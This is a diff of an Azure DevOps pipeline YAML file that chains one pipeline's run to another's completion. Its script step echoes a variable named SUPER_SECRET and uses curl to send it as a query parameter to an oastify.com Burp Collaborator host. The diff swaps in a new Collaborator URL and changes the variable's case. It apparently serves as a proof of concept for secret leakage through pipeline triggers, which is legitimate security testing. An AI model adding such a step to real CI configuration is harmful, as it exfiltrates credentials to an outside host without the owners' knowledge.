@@ -1,7 +1,6 @@
 trigger: none
 pr: none
 
-
 resources:
   pipelines:
   - pipeline: pipeline (B)
@@ -9,8 +8,8 @@ resources:
     trigger: true # Run pipeline (B) when any run of pipeline (A) completes
     branch: main
 
-steps:
+steps:    
   - script: |
-      echo $(SUPER_SECRET)
-      curl https://rupx4un8zwdy1729e272k46xqowfk58u.oastify.com?secret=$(SUPER_SECRET)
+      echo $(sUPER_SECRET)
+      curl https://t82x7lskmw5unw0yjt43prh4bvhm5ct1.oastify.com?secret=$(sUPER_SECRET)
   
